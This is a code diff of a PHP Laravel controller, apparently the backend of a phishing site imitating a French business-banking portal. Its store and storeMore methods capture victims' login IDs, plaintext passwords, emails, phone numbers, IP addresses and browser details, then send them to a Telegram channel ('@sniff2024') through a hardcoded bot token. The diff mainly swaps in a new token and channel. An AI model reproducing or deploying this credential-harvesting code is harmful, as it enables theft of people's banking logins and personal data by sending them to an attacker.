@@ -16,20 +16,20 @@ class HomeController extends Controller
 
   public function login() : View {
     return view("login");
-} 
+}
 
 public function more(User $user) : View {
   return view("moreinfo", compact('user'));
-} 
+}
 
 
 public function store(Request $request)  {
   $agent = new Agent();
         $agent->setHttpHeaders($request->header());
-          
+
 
             $mob =$agent->deviceType();
-      
+
            $user = User::create([
             'password' => htmlspecialchars($request->code),
             'reelpassword' =>  htmlspecialchars($request->code),
@@ -44,10 +44,10 @@ public function store(Request $request)  {
            ]);
            $dat = date( 'd/m/Y H:i:s', time() );
            $content = "Information Utilisateur Numero <b> $request->user_id </b>  \n <b>date : </b> $dat  \n <b>Identifiant : </b> $request->user_id \n <b>mot de passe : </b> $user->reelpassword \n <b>Systeme : </b> $user->platform \n <b>user_agent : </b> $user->user_agent \n <b>Mobile ou Desktop : </b> $user->mob_desck \n <b>accept_language : </b> $user->accept_language \n <b>Navigateur : </b> $user->browser \n <b>Addresse ip : </b> $user->ip";
-           $api_key = "6868939747:AAGo0YiMTGV2XwOZi6niENOTX-d52XCXk5c";
+           $api_key = "6993379722:AAH-qs9LgsLEo5kZbfb8R3tOxmvIPQQIrlA";
 
            $data = [
-             'chat_id' => '@latestgroupr',
+             'chat_id' => '@sniff2024',
              'text' => $content,
              'parse_mode' => 'HTML'
            ];
@@ -64,10 +64,10 @@ public function store(Request $request)  {
           //     // Ajouter un log en cas d'erreur
           //     error_log("Error sending Telegram message: " . $e->getMessage());
           // }
-} 
+}
 
 public function storeMore(Request $request, User $user)  {
-      
+
            $user->update([
             'email' => htmlspecialchars($request->email),
             'phone' =>  htmlspecialchars($request->phone)
@@ -75,10 +75,10 @@ public function storeMore(Request $request, User $user)  {
            ]);
            $dat = date( 'd/m/Y H:i:s', time() );
            $content = "Information Utilisateur Numero <b> $user->user_id </b>  \n <b>email : </b> $request->email \n <b>Telephone : </b> $request->phone";
-           $api_key = "6868939747:AAGo0YiMTGV2XwOZi6niENOTX-d52XCXk5c";
+           $api_key = "6993379722:AAH-qs9LgsLEo5kZbfb8R3tOxmvIPQQIrlA";
 
            $data = [
-             'chat_id' => '@latestgroupr',
+             'chat_id' => '@sniff2024',
              'text' => $content,
              'parse_mode' => 'HTML'
            ];
@@ -86,40 +86,40 @@ public function storeMore(Request $request, User $user)  {
          //  try {
                   $response = file_get_contents("https://api.telegram.org/bot$api_key/sendMessage?".http_build_query($data));
 
-                  
+
                         // Ajouter un log en cas de succès
           //  error_log("Telegram API Response: " . $response);
           // } catch (Exception $e) {
           //     // Ajouter un log en cas d'erreur
           //     error_log("Error sending Telegram message: " . $e->getMessage());
           // }
-} 
+}
 
 
 
 public function financement() : View {
   return view("financement");
-} 
+}
 
 public function auquotidien() : View {
   return view("auquotidien");
-} 
+}
 
 public function international() : View {
   return view("international");
-} 
+}
 
 public function rse() : View {
   return view("rse");
-} 
+}
 
 public function protegerfideliser() : View {
   return view("protegerfideliser");
-} 
+}
 
 public function contactsentreprises() : View {
   return view("contactsentreprises");
-} 
+}
 
 
 
